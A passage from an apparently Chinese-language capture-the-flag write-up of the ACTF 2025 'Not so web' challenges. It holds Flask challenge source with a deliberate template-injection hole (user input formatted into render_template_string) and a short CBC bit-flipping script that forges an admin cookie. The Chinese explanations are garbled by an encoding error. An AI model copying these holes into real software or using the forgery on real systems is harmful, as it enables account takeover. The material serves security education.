class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&quot;POST&quot;</span>:<br>        username = request.form[<span class="hljs-string">&quot;username&quot;</span>]<br>        password = request.form[<span class="hljs-string">&quot;password&quot;</span>]<br>        <span class="hljs-keyword">if</span> username <span class="hljs-keyword">in</span> users <span class="hljs-keyword">and</span> users[username].password_raw == password:<br>            resp = redirect(url_for(<span class="hljs-string">&quot;home&quot;</span>))<br>            resp.set_cookie(<span class="hljs-string">&quot;jwbcookie&quot;</span>, generate_cookie(users[username]))<br>            <span class="hljs-keyword">return</span> resp<br>        <span class="hljs-keyword">else</span>:<br>            flash(<span class="hljs-string">&quot;Invalid credentials. Please try again.&quot;</span>, <span class="hljs-string">&quot;danger&quot;</span>)<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;login.html&quot;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/home&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">home</span>():<br>    valid, current_username = parse_cookie(request.cookies.get(<span class="hljs-string">&quot;jwbcookie&quot;</span>))<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> valid <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> current_username:<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&quot;logout&quot;</span>))<br><br>    user_profile = users.get(current_username)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> user_profile:<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&quot;logout&quot;</span>))<br><br>    <span class="hljs-keyword">if</span> current_username == <span class="hljs-string">&quot;admin&quot;</span>:<br>        payload = request.args.get(<span class="hljs-string">&quot;payload&quot;</span>)<br>        html_template = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">&lt;!DOCTYPE html&gt;</span><br><span class="hljs-string">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="hljs-string">&lt;head&gt;</span><br><span class="hljs-string">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="hljs-string">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="hljs-string">    &lt;title&gt;Home&lt;/title&gt;</span><br><span class="hljs-string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css&quot;&gt;</span><br><span class="hljs-string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;&#123;&#123; url_for(&#x27;static&#x27;, filename=&#x27;styles.css&#x27;) &#125;&#125;&quot;&gt;</span><br><span class="hljs-string">&lt;/head&gt;</span><br><span class="hljs-string">&lt;body&gt;</span><br><span class="hljs-string">    &lt;div class=&quot;container&quot;&gt;</span><br><span class="hljs-string">        &lt;h2 class=&quot;text-center&quot;&gt;Welcome, %s !&lt;/h2&gt;</span><br><span class="hljs-string">        &lt;div class=&quot;text-center&quot;&gt;</span><br><span class="hljs-string">            Your payload: %s</span><br><span class="hljs-string">        &lt;/div&gt;</span><br><span class="hljs-string">        &lt;img src=&quot;&#123;&#123; url_for(&#x27;static&#x27;, filename=&#x27;interesting.jpeg&#x27;) &#125;&#125;&quot; alt=&quot;Embedded Image&quot;&gt;</span><br><span class="hljs-string">        &lt;div class=&quot;text-center&quot;&gt;</span><br><span class="hljs-string">            &lt;a href=&quot;/logout&quot; class=&quot;btn btn-danger&quot;&gt;Logout&lt;/a&gt;</span><br><span class="hljs-string">        &lt;/div&gt;</span><br><span class="hljs-string">    &lt;/div&gt;</span><br><span class="hljs-string">&lt;/body&gt;</span><br><span class="hljs-string">&lt;/html&gt;</span><br><span class="hljs-string">&quot;&quot;&quot;</span> % (<br>            current_username,<br>            payload,<br>        )<br>    <span class="hljs-keyword">else</span>:<br>        html_template = (<br>            <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">&lt;!DOCTYPE html&gt;</span><br><span class="hljs-string">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="hljs-string">&lt;head&gt;</span><br><span class="hljs-string">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="hljs-string">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="hljs-string">    &lt;title&gt;Home&lt;/title&gt;</span><br><span class="hljs-string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css&quot;&gt;</span><br><span class="hljs-string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;&#123;&#123; url_for(&#x27;static&#x27;, filename=&#x27;styles.css&#x27;) &#125;&#125;&quot;&gt;</span><br><span class="hljs-string">&lt;/head&gt;</span><br><span class="hljs-string">&lt;body&gt;</span><br><span class="hljs-string">    &lt;div class=&quot;container&quot;&gt;</span><br><span class="hljs-string">        &lt;h2 class=&quot;text-center&quot;&gt;server code (encoded)&lt;/h2&gt;</span><br><span class="hljs-string">        &lt;div class=&quot;text-center&quot; style=&quot;word-break:break-all;&quot;&gt;</span><br><span class="hljs-string">        &#123;%% raw %%&#125;</span><br><span class="hljs-string">            %s</span><br><span class="hljs-string">        &#123;%% endraw %%&#125;</span><br><span class="hljs-string">        &lt;/div&gt;</span><br><span class="hljs-string">        &lt;div class=&quot;text-center&quot;&gt;</span><br><span class="hljs-string">            &lt;a href=&quot;/logout&quot; class=&quot;btn btn-danger&quot;&gt;Logout&lt;/a&gt;</span><br><span class="hljs-string">        &lt;/div&gt;</span><br><span class="hljs-string">    &lt;/div&gt;</span><br><span class="hljs-string">&lt;/body&gt;</span><br><span class="hljs-string">&lt;/html&gt;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>            % base64.b64encode(<span class="hljs-built_in">open</span>(__file__, <span class="hljs-string">&quot;rb&quot;</span>).read()).decode()<br>        )<br>    <span class="hljs-keyword">return</span> render_template_string(html_template)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/logout&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">logout</span>():<br>    resp = redirect(url_for(<span class="hljs-string">&quot;login&quot;</span>))<br>    resp.delete_cookie(<span class="hljs-string">&quot;jwbcookie&quot;</span>)<br>    <span class="hljs-keyword">return</span> resp<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run()<br></code></pre></td></tr></table></figure><p>CBCï¼ˆCipher Block Chainingï¼ŒåŠ å¯†å—é“¾æ¥æ¨¡å¼ï¼‰æ˜¯ä¸€ç§<strong>å—åŠ å¯†æ¨¡å¼</strong></p><h3 id="CBCåŠ å¯†è¿‡ç¨‹"><a href="#CBCåŠ å¯†è¿‡ç¨‹" class="headerlink" title="CBCåŠ å¯†è¿‡ç¨‹"></a>CBCåŠ å¯†è¿‡ç¨‹</h3><p>å‡è®¾ï¼š</p><ul><li>æ˜æ–‡è¢«åˆ‡æˆå¤šä¸ªå—ï¼š<code>P1</code>, <code>P2</code>, <code>P3</code>, â€¦, <code>Pn</code> ï¼ˆæ¯å—æ˜¯128ä½ &#x3D; 16å­—èŠ‚ï¼‰</li><li>å¯†æ–‡æ˜¯ï¼š<code>C1</code>, <code>C2</code>, <code>C3</code>, â€¦, <code>Cn</code></li><li>å¯†é’¥æ˜¯å›ºå®šçš„ã€‚</li><li>IVï¼ˆInitialization Vectorï¼‰æ˜¯ä¸€ä¸ªéšæœºçš„16å­—èŠ‚æ•°æ®ï¼Œä½œä¸º<strong>ç¬¬ä¸€ä¸ªå—çš„å‰ç½®å¯†æ–‡</strong>ã€‚</li></ul><p>åŠ å¯†æ­¥éª¤æ˜¯ï¼š</p><p>ç¬¬ä¸€ä¸ªå—åŠ å¯†ï¼š</p><p>C1 &#x3D; AES_encrypt(P1 ^ IV)</p><p>ç¬¬äºŒä¸ªå—åŠ å¯†ï¼š</p><p>C2 &#x3D; AES_encrypt(P2 ^ C1)</p><p>ä»¥æ­¤ç±»æ¨</p><h3 id="CBCè§£å¯†è¿‡ç¨‹"><a href="#CBCè§£å¯†è¿‡ç¨‹" class="headerlink" title="CBCè§£å¯†è¿‡ç¨‹"></a>CBCè§£å¯†è¿‡ç¨‹</h3><p>ç¬¬ä¸€ä¸ªå—è§£å¯†ï¼š</p><p>P1 &#x3D; AES_decrypt(C1) ^ IV</p><p>ç¬¬äºŒä¸ªå—è§£å¯†ï¼š</p><p>P2 &#x3D; AES_decrypt(C2) ^ C1</p><p>æœªåŠ å¯†å­—ç¬¦ä¸²æ˜¯â€™{â€œnameâ€: â€œadminâ€, â€œpassword_rawâ€: â€œadminâ€, â€œregister_timeâ€: -1}â€™</p><p>l6å­—èŠ‚ä¸ºä¸€å—ï¼Œadminåœ¨ç¬¬ä¸€å—P1, æ ‡è®°P1â€™&#x3D;â€™nâ€™ï¼Œå¯¹åº”ä½ç½®ä¸ºC1â€™</p><p>ç”¨admi1æ³¨å†Œæ‹¿ä¸€ä¸ªcookie,  P1 &#x3D; â€˜1â€™ å¯¹åº”C1, åªéœ€è¦æ”¹ivå°±è¡Œï¼Œc1ä¸å˜</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">p1</span> = aes_decrypt(c1)<span class="hljs-regexp"> ^</span> iv<br>p1<span class="hljs-string">&#x27; = aes_decrypt(c1) ^ iv&#x27;</span><br>iv<span class="hljs-string">&#x27; = iv ^ p1 ^ p1&#x27;</span><br></code></pre></td></tr></table></figure><p>è¿™æ ·å°±å¯ä»¥ä¼ªé€ adminäº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> app <span class="hljs-keyword">import</span> parse_cookie,users,generate_cookie<br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-comment"># p1 = aes_decrypt(c1) ^ iv</span><br><span class="hljs-comment"># p1&#x27; = aes_decrypt(c1) ^ iv&#x27;</span><br><span class="hljs-comment"># iv&#x27; = iv ^ p1 ^ p1&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cbc_bitflip</span>(<span class="hljs-params">ciphertext:<span class="hljs-built_in">str</span>,index:<span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">str</span>:<br>    ciphertext = base64.b64decode(ciphertext)<br>    iv = ciphertext[:<span class="hljs-number">16</span>]<br>    ciphertext = ciphertext[<span class="hljs-number">16</span>:]<br>    new_index = <span class="hljs-built_in">bytearray</span>(iv)<br>    new_index[index]=iv[index]^<span class="hljs-built_in">ord</span>(<span class="hljs-string">&quot;1&quot;</span>)^<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;n&#x27;</span>)<br>    <span class="hljs-keyword">return</span> base64.b64encode(new_index+ciphertext).decode()<br><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    cookie = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;../.idea/httpRequests/http-client.cookies&#x27;</span>,<span class="hljs-string">&quot;r&quot;</span>).readlines()[<span class="hljs-number">2</span>].split(<span class="hljs-string">&#x27;\t&#x27;</span>)[-<span class="hljs-number">2</span>]<br>    index=<span class="hljs-string">&#x27;&#123;&quot;name&quot;: &quot;admin&quot;, &quot;password_raw&quot;: &quot;admin&quot;, &quot;register_time&quot;: -1&#125;&#x27;</span>.find(<span class="hljs-string">&#x27;n&quot;&#x27;</span>)<br>    admin_cookie = cbc_bitflip(cookie,index)<br>    <span class="hljs-built_in">print</span>(parse_cookie(admin_cookie))<br></code></pre></td></tr></table></figure><h3 id="æµ‹è¯•ä»£ç "><a href="#æµ‹è¯•ä»£ç " class="headerlink" title="æµ‹è¯•ä»£ç "></a>æµ‹è¯•ä»£ç </h3><p><a href="https://github.com/xiaotian2023/CTF-Web-Review/tree/main/actf2025/not%20so%20web%201">https://github.com/xiaotian2023/CTF-Web-Review/tree/main/actf2025/not%20so%20web%201</a></p><h2 id="Not-so-web-2"><a href="#Not-so-web-2" class="headerlink" title="Not so web 2"></a>Not so web 2</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64, json, time<br><span class="hljs-keyword">import</span> os, sys, binascii<br><span class="hljs-keyword">from</span> dataclasses <span class="hljs-keyword">import</span> dataclass, asdict<br><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">Dict</span>, <span class="hljs-type">Tuple</span><br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> KEY, ADMIN_PASSWORD<br><span class="hljs-keyword">from</span> Crypto.PublicKey <span class="hljs-keyword">import</span> RSA<br><span class="hljs-keyword">from</span> Crypto.Signature <span class="hljs-keyword">import</span> PKCS1_v1_5<br><span class="hljs-keyword">from</span> Crypto.Hash <span class="hljs-keyword">import</span> SHA256<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> (<br>    Flask,<br>    render_template,<br>    render_template_string,<br>    request,<br>    redirect,<br>    url_for,<br>    flash,<br>    session,<br>    abort,<br>)<br><br>app = Flask(__name__)<br>app.secret_key = KEY<br><br><span class="hljs-keyword">if</span> os.path.exists(<span class="hljs-string">&quot;/etc/ssl/private/server.key&quot;</span>):<br>    private_key = RSA.importKey(<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/etc/ssl/private/server.key&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>).read())<br><span class="hljs-keyword">else</span>:<br>    private_key = RSA.generate(<span class="hljs-number">2048</span>)<br><br>public_key = private_key.publickey()<br><br><br><span class="hljs-meta">@dataclass</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">APPUser</span>:<br>    name: <span class="hljs-built_in">str</span><br>    password_raw: <span class="hljs-built_in">str</span><br>    register_time: <span class="hljs-built_in">int</span><br><br><br><span class="hljs-comment">#  In-memory store for user registration</span><br>users: <span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, APPUser] = &#123;<br>    <span class="hljs-string">&quot;admin&quot;</span>: APPUser(name=<span class="hljs-string">&quot;admin&quot;</span>, password_raw=ADMIN_PASSWORD, register_time=-<span class="hljs-number">1</span>)<br>&#125;<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">validate_cookie</span>(<span class="hljs-params">cookie_b64: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bool</span>:<br>    valid, _ = parse_cookie(cookie_b64)<br>    <span class="hljs-keyword">return</span> valid<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_cookie</span>(<span class="hljs-params">cookie_b64: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-type">Tuple</span>[<span class="hljs-built_in">bool</span>, <span class="hljs-built_in">str</span>]:<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> cookie_b64:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>, <span class="hljs-string">&quot;&quot;</span><br><br>    <span class="hljs-keyword">try</span>:<br>        cookie = base64.b64decode(cookie_b64, validate=<span class="hljs-literal">True</span>).decode()<br>    <span class="hljs-keyword">except</span> binascii.Error:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>, <span class="hljs-string">&quot;&quot;</span><br><br>    <span class="hljs-keyword">try</span>:<br>        msg_str, sig_hex = cookie.split(<span class="hljs-string">&quot;&amp;&quot;</span>)<br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>, <span class="hljs-string">&quot;&quot;</span><br><br>    msg_dict = json.loads(msg_str)<br>    msg_str_bytes = msg_str.encode()<br>    msg_hash = SHA256.new(msg_str_bytes)<br>    sig = <span class="hljs-built_in">bytes</span>.fromhex(sig_hex)<br>    <span class="hljs-keyword">try</span>:<br>        PKCS1_v1_5.new(public_key).verify(msg_hash, sig)<br>        valid = <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">except</span> (ValueError, TypeError):<br>        valid = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> valid, msg_dict.get(<span class="hljs-string">&quot;user_name&quot;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_cookie</span>(<span class="hljs-params">user: APPUser</span>) -&gt; <span class="hljs-built_in">str</span>:<br>    msg_dict = &#123;<span class="hljs-string">&quot;user_name&quot;</span>: user.name, <span class="hljs-string">&quot;login_time&quot;</span>: <span class="hljs-built_in">int</span>(time.time())&#125;<br>    msg_str = json.dumps(msg_dict)<br>    msg_str_bytes = msg_str.encode()<br>    msg_hash = SHA256.new(msg_str_bytes)<br>    sig = PKCS1_v1_5.new(private_key).sign(msg_hash)<br>    sig_hex = sig.<span class="hljs-built_in">hex</span>()<br>    packed = msg_str + <span class="hljs-string">&quot;&amp;&quot;</span> + sig_hex<br>    <span class="hljs-keyword">return</span> base64.b64encode(packed.encode()).decode()<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">if</span> validate_cookie(request.cookies.get(<span class="hljs-string">&quot;jwbcookie&quot;</span>)):<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&quot;home&quot;</span>))<br>    <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&quot;login&quot;</span>))<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/register&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">register</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&quot;POST&quot;</span>:<br>        user_name = request.form[<span class="hljs-string">&quot;username&quot;</span>]<br>        password = request.form[<span class="hljs-string">&quot;password&quot;</span>]<br>        <span class="hljs-keyword">if</span> user_name <span class="hljs-keyword">in</span> users:<br>            flash(<span class="hljs-string">&quot;Username already exists!&quot;</span>, <span class="hljs-string">&quot;danger&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            users[user_name] = APPUser(<br>                name=user_name, password_raw=password, register_time=<span class="hljs-built_in">int</span>(time.time())<br>            )<br>            flash(<span class="hljs-string">&quot;Registration successful! Please login.&quot;</span>, <span class="hljs-string">&quot;success&quot;</span>)<br>            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&quot;login&quot;</span>))<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;register.html&quot;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/login&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&quot;POST&quot;</span>:<br>        username = request.form[<span class="hljs-string">&quot;username&quot;</span>]<br>        password = request.form[<span class="hljs-string">&quot;password&quot;</span>]<br>        <span class="hljs-keyword">if</span> username <span class="hljs-keyword">in</span> users <span class="hljs-keyword">and</span> users[username].password_raw == password:<br>            resp = redirect(url_for(<span class="hljs-string">&quot;home&quot;</span>))<br>            resp.set_cookie(<span class="hljs-string">&quot;jwbcookie&quot;</span>, generate_cookie(users[username]))<br>            <span class="hljs-keyword">return</span> resp<br>        <span class="hljs-keyword">else</span>:<br>            flash(<span class="hljs-string">&quot;Invalid credentials. Please try again.&quot;</span>, <span class="hljs-string">&quot;danger&quot;</span>)<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;login.html&quot;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/home&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">home</span>():<br>    valid, current_username = parse_cookie(request.cookies.get(<span class="hljs-string">&quot;jwbcookie&quot;</span>))<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> valid <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> current_username:<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&quot;logout&quot;</span>))<br><br>    user_profile = users.get(current_username)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> user_profile:<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&quot;logout&quot;</span>))<br><br>    <span class="hljs-keyword">if</span> current_username == <span class="hljs-string">&quot;admin&quot;</span>:<br>        payload = request.args.get(<span class="hljs-string">&quot;payload&quot;</span>)<br>        <span class="hljs-keyword">if</span> payload:<br>            <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> payload:<br>                <span class="hljs-keyword">if</span> char <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;&#x27;_#&amp;;&quot;</span>:<br>                    abort(<span class="hljs-number">403</span>)<br>                    <span class="hljs-keyword">return</span><br><br>        html_template = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">&lt;!DOCTYPE html&gt;</span><br><span class="hljs-string">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="hljs-string">&lt;head&gt;</span><br><span class="hljs-string">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="hljs-string">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="hljs-string">    &lt;title&gt;Home&lt;/title&gt;</span><br><span class="hljs-string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css&quot;&gt;</span><br><span class="hljs-string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;&#123;&#123; url_for(&#x27;static&#x27;, filename=&#x27;styles.css&#x27;) &#125;&#125;&quot;&gt;</span><br><span class="hljs-string">&lt;/head&gt;</span><br><span class="hljs-string">&lt;body&gt;</span><br><span class="hljs-string">    &lt;div class=&quot;container&quot;&gt;</span><br><span class="hljs-string">        &lt;h2 class=&quot;text-center&quot;&gt;Welcome, %s !&lt;/h2&gt;</span><br><span class="hljs-string">        &lt;div class=&quot;text-center&quot;&gt;</span><br><span class="hljs-string">            Your payload: %s</span><br><span class="hljs-string">        &lt;/div&gt;</span><br><span class="hljs-string">        &lt;img src=&quot;&#123;&#123; url_for(&#x27;static&#x27;, filename=&#x27;interesting.jpeg&#x27;) &#125;&#125;&quot; alt=&quot;Embedded Image&quot;&gt;</span><br><span class="hljs-string">        &lt;div class=&quot;text-center&quot;&gt;</span><br><span class="hljs-string">            &lt;a href=&quot;/logout&quot; class=&quot;btn btn-danger&quot;&gt;Logout&lt;/a&gt;</span><br><span class="hljs-string">        &lt;/div&gt;</span><br><span class="hljs-string">    &lt;/div&gt;</span><br><span class="hljs-string">&lt;/body&gt;</span><br><span class="hljs-string">&lt;/html&gt;</span><br><span class="hljs-string">&quot;&quot;&quot;</span> % (<br>            current_username,<br>            payload,<br>        )<br>    <span class="hljs-keyword">else</span>:<br>        html_template = (<br>            <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">&lt;!DOCTYPE html&gt;</span><br><span class="hljs-string">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="hljs-string">&lt;head&gt;</span><br><span class="hljs-string">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="hljs-string">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="hljs-string">    &lt;title&gt;Home&lt;/title&gt;</span><br><span class="hljs-string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css&quot;&gt;</span><br><span class="hljs-string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;&#123;&#123; url_for(&#x27;static&#x27;, filename=&#x27;styles.css&#x27;) &#125;&#125;&quot;&gt;</span><br><span class="hljs-string">&lt;/head&gt;</span><br><span class="hljs-string">&lt;body&gt;</span><br><span class="hljs-string">    &lt;div 